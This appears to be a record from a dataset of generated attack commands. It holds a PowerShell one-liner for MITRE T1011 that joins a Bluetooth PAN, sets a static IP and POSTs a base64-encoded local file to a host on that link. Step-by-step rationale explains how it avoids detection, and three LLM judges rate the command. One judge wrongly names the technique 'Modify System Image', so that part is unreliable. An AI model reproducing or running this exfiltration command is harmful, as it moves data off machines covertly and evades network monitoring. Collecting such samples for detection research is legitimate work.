command: & 'C:\Tools\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name="$if" static 172.27.45.2 255.255.255.252 | Out-Null; $body=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Users\Public\Pictures\img1.png')); $ProgressPreference='SilentlyContinue'; Invoke-WebRequest -Uri 'http://172.27.45.1:52873/u' -Method POST -Body $body -UseBasicParsing -Headers @{ 'X-T'='b' } | Out-Null
explanation: Uses Bluetooth PAN with a static IP and exfiltrates data via an HTTP POST to a custom port reachable only over the Bluetooth link (T1011).
rationale_steps: Activate NAP over Bluetooth as the alternate network medium.
Assign a restricted /30 IP on the Bluetooth interface with netsh.
Use HTTP on a high, nonstandard port to minimize detection.
Ensure destination is on the Bluetooth-only subnet to force egress via Bluetooth.

llm_judgments.syntactic_justification: The command is perfectly well-formed with balanced quotes, proper command separators, valid PowerShell syntax, and correct use of cmdlets and parameters.
llm_judgments.semantic_justification: The command fully implements the T1011 technique by establishing a Bluetooth PAN connection with static IP addressing and exfiltrating data (encoded image file) via HTTP POST to a specific endpoint over that connection, which aligns with the exfiltration over alternative protocol technique.

llm_judgments.syntactic_justification: The command is perfectly well-formed, using correct PowerShell syntax, valid cmdlet parameters, proper command separators, and balanced quoting for all its components.
llm_judgments.semantic_justification: While the command correctly performs Bluetooth PAN connection, static IP configuration, and data exfiltration, these actions are entirely unrelated to the T1011 'Modify System Image' technique, which focuses on altering OS/firmware images.

llm_judgments.syntactic_justification: The PowerShell one-liner is well-formed with balanced quotes/braces, valid separators, and parseable commands/arguments.
llm_judgments.semantic_justification: It plausibly attempts Bluetooth PAN setup and HTTP POST exfiltration, but reliability is reduced by likely admin requirements for netsh, potential netsh syntax needing a gateway/none, and uncertainty about BluetoothCL supporting the specified /connect NAP usage.
